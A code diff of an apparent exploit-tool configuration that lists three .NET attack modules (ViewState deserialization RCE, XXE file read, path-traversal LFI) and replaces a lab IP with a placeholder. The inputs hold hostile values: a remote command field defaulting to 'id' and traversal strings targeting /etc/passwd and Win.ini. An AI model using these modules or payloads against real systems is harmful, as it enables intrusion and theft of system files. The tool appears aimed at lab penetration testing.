@@ -227,11 +227,11 @@ EXPLOITS = {
         "affected": [".NET Framework 4.0-4.8", "ASP.NET (classic)"],
         "note": "ViewState with weak/known machine_key → BinaryFormatter gadget → RCE. Native: scanner sends crafted ViewState cookie.",
         "inputs": [
-            _in("Hedef URL", "url", True, "", "http://192.168.8.123:8080/default.aspx"),
+            _in("Hedef URL", "url", True, "", "http://LAB_IP:8080/default.aspx"),
             _in("Komut", "cmd", False, "id", "id | whoami"),
             _in("Machine Key", "machine_key", False, "", "decryptionKey:validationKey"),
             _in("ViewState field", "viewstate_field", False, "ViewState", "ViewState"),
-            _in("Kanıt path", "proof_fetch", False, "/proof.txt", "/proof.txt"),
+            _in("Kanit path", "proof_fetch", False, "/proof.txt", "/proof.txt"),
         ],
         "run": _viewstate_rce,
     },
@@ -241,7 +241,7 @@ EXPLOITS = {
         "affected": [".NET XML parsers (XmlDocument, XmlReader)", "ASP.NET (classic + Core)"],
         "note": "XXE (CWE-611) — .NET XML parser with external entity processing → arbitrary file read / SSRF.",
         "inputs": [
-            _in("Hedef URL", "url", True, "", "http://192.168.8.123:8080/api/xml"),
+            _in("Hedef URL", "url", True, "", "http://LAB_IP:8080/api/xml"),
             _in("Dosya", "file", False, "/etc/passwd", "/etc/passwd | C:\\Windows\\Win.ini"),
             _in("Method", "method", False, "POST", "GET | POST"),
             _in("Param", "param", False, "xml", "xml | data"),
@@ -254,7 +254,7 @@ EXPLOITS = {
         "affected": [".NET file read endpoints", "ASP.NET (classic + Core)"],
         "note": "Path traversal LFI (CWE-22) — .NET file read without sanitization → arbitrary file read.",
         "inputs": [
-            _in("Hedef URL", "url", True, "", "http://192.168.8.123:8080/read"),
+            _in("Hedef URL", "url", True, "", "http://LAB_IP:8080/read"),
             _in("Param", "param", False, "file", "file | path"),
             _in("Path", "path", False, "../../../../../../etc/passwd", "../../../../../../etc/passwd"),
             _in("Method", "method", False, "GET", "GET | POST"),
